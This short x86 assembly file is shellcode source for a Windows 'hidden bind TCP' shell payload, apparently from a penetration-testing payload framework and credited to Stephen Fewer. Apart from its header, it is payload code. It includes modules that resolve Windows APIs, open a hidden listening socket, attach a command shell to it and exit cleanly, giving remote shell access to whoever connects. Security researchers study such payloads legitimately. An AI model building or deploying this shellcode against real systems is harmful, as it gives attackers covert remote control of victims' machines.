;-----------------------------------------------------------------------------;
; Author: Stephen Fewer (stephen_fewer[at]harmonysecurity[dot]com)
; Compatible: Windows 7, 2008, Vista, 2003, XP, 2000, NT4
; Version: 1.0 (28 July 2009)
; Size: 341 bytes
; Build: >build.py single_shell_bind_tcp
;-----------------------------------------------------------------------------;
[BITS 32]
[ORG 0]

  cld                    ; Clear the direction flag.
  call start             ; Call start, this pushes the address of 'api_call' onto the stack.
%include "./src/block/block_api.asm"
start:                   ;
  pop ebp                ; Pop off the address of 'api_call' for calling later.
%include "./src/block/block_hidden_bind_tcp.asm"
  ; By here we will have performed the bind_tcp connection and EDI will be out socket.
%include "./src/block/block_shell.asm"
	; Finish up with the EXITFUNK.
%include "./src/block/block_exitfunk.asm"
